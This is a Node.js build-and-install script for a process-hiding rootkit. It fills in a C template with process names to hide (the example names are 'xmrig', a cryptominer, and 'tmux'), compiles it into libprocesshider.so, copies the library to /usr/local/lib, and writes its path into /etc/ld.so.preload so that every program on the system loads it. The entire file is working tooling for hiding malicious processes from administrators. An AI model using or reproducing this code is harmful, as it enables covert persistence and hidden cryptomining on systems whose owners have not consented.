const fs = require("fs");
const path = require("path");
const shell = require("shelljs");
const { setDefine } = require("./tools");

const sourceFileName = "processhider.c";
const libFileName = "libprocesshider.so";

const projectDir = path.resolve(__dirname, "../");
const buildDir = path.resolve(projectDir, "./build");
const libDir = "/usr/local/lib";

const tplFilePath = path.resolve(projectDir, "./src/tpl.c");
const dumpFilePath = path.resolve(projectDir, ".dump.json");
const sourceFilePath = path.resolve(buildDir, sourceFileName);
const buildFilePath = path.resolve(buildDir, libFileName);
const libFilePath = path.resolve(libDir, libFileName);
const injectFilePath = "/etc/ld.so.preload";

/**
 * @name setProcessFilters
 * @description Build c file.
 * @param {Array} processFileters Process name filters. Like ["xmrig", "tmux"]
 */
function configue(processFileters) {
  if (Object.prototype.toString.call(processFileters) !== "[object Array]") {
    console.log("[ERROR] processFileters must be array.");
    return -1;
  }

  const processCount = processFileters.length;

  let content = fs.readFileSync(tplFilePath, "utf8");
  content = setDefine(content, "PROCESS_COUNT", processCount);
  content = setDefine(content, "PROCESS_LIST", processFileters);

  shell.mkdir("-p", buildDir);
  fs.writeFileSync(sourceFilePath, content);
}

/**
 * @name compile
 * @description Compile dynamic library.
 */
function compile() {
  shell.exec(`gcc -Wall -fPIC -shared -o ${buildFilePath} ${sourceFilePath} -ldl`);
}

/**
 * @name install
 * @description Inject dynamic lib at /etc/ ld.so.preload
 */
function install() {
  shell.cp(buildFilePath, libFilePath);

  if (!shell.exec(`cat ${injectFilePath} | grep ${libFilePath}`, { silent: true }).stdout) {
    shell.exec(`echo ${libFilePath} > ${injectFilePath}`, { silent: true });
  }
}

/**
 * @name uninstall
 * @description Remove dynamic libs and cache file.
 */
function uninstall() {
  shell.sed("-i", libFilePath, "", injectFilePath);
  shell.rm("-rf", libFilePath);
  shell.rm("-rf", dumpFilePath);
}

module.exports = {
  configue,
  compile,
  install,
  uninstall
};
